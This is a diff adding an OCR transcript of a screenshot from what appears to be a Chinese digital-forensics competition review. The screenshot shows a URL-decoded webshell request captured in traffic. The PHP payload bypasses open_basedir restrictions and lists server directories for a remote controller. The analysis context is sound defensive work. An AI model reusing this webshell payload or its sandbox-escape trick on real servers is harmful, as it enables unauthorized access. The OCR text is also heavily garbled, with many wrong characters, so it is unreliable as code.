@@ -1,0 +1,29 @@
+# OCR: c079d3eb642116f888ce594f2ffa4db7.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/c079d3eb642116f888ce594f2ffa4db7.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Recipe URLDecode
+a
+■?
+input
+口
+田
++
+%4eini_set(%22display_errors%22%2c%20%220%22)%3B%4eset_time_1imit(e)%3B%24opdir%3D%40iniget(%22open_basedir%22)%3Bif(%2 40pdir)%2e%7B%240parr%3Dpreg_sp11t(%22%2F%5c%5C%5C%5%7C%5C%2F%2F%22%2C%240pdir)%3B%240Cwd%3Ddirname(%24_SERVER%5B%22SCR IPT_FILENAME%22%5D)%3B%24tmdir%3D%22.39dae7%22%38%40mkdir(%24tmdir)%3B%4echdir(%24tmdir)%38%4eini_set(%220penba5edir%22%2C%22..%22)%3Bfor(%241%3De%3B%241%3Csizeof(%24oparr)%3B%241%2B%2B)%7B%4echdir(%22..%22)%3B%7D%4eini_set(%22open_basedir%22%2C%22%2F%22)%3B%4ermdir(%240cwd.%22%2F%22.%24tmdir)%3B%7D%3Bfunction%2easenc(%24out)%7Breturn%2e%24out%3B%7D%3Bfunct ion%2easoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%2e%22659%22.%22692%22%3Becho%2e%48asenc(%24outp ut)%3Becho%2e%22620e36%22.%22df23ea%22%3B%7Dob_start()%3Btry%7B%24D%3Dbase64_decode(substr(%24_P0ST%58%22oebdc7ea2574c3% 22%5D%2C2))%3B%24F%3D%48opendir(%24D)%3Bif(%24F%3D%3DNULL)%7Becho(%22ERROR%3A%2F%2F%2ePath%2eNot%20Found%2eOr%2eNo%2ePer mission!%22)%3B%7De1se%78%24M%3DNULL%3B%24L%3DNULL%3Bwhile(%24N%3D%4ereaddir(%24F))%78%24P%3D%24D.%24N%3B%24T%3D%4edate(%22Y-m-d%20H%3Ai%3As%22%2C%4efilemtime(%24P))%3B%4e%24E%3Dsubstr(base_convert(%4efi1eperms(%24P)%2C1e%2C8)%2C-
+4)%3B%24R%3D%22%9%22.%24T%22%09%22.%40f11es1ze(%24P).%22%09%22.%24E.%22%0A%22%3B1f(%40isd1r(%24P))%24M.%3D%24N.%22%2F%22.%24R%3Belse%20%24L.%3D%24N.%24R%3B%7Decho%26%24M.%24L%3B%4ec10sedir(%24F)%3B%7D%3B%7Dcatch(Exception%20%24e)%7Becho% 2@%22ERROR%3A%2F%2F%22.%24e-%3EgetMes5age()%3B%7D%3Basoutput()%3Bdie()%3B
+1503 Output
+@ini_set("display_errors","e");@set_time_limit(e);sopdir=@ini_get("open_basedir");if($opdir)
+Tr Ra Bytes.
+a
+用
+(Soparr-preg_split("/\11//V//",$opdir);Socwd-dirname($_SERVER["SCRIPT_FILENAME"]);$tmdir-"39dae7":@mkdir($tmdir):@chdir(stmdir);@ini_set(openbasedir-,"..");for(si-e;si<sizeof($oparr);si++)
+(@chdir("..");)@ini_set("open_basedir","/"):@rmdir($ocwd."/".Stmdir););functionasenc(Sout)(returnSout:);function
+asoutput()(Soutput-ob_get_contents():obend clean():echo"65g"."692";echo@asenc(soutput);echo"62ee36"."df23ea":)ob_start();try
+sD-base64_decode(substr($_PoST["oBbdc7ea2574c3"].2))$F-@opendir(SD);if($F--NULL)
+(echo("ERROR://Path Not Found Or No Permission!))else(SM=NULL;$L=NULLjwhile(SN=ereaddir(SF))(SP=SD.SN;ST-@date("Y-m-
+dH:i:s.@filemtime(sP));@sE-substr(base_convert(@fileperms($P),1e,8),-4);sR-"
+".$T."
+-@filesize(sp).
+".SE.
+";if(@is_dir($P))SM,=SN."/".SR;else $L.=SN.SR;}echo SM.$L;@closedir($F);;)catch(Exception Se)(echo"ERROR://",Se->getMessage();3asoutput();die(:
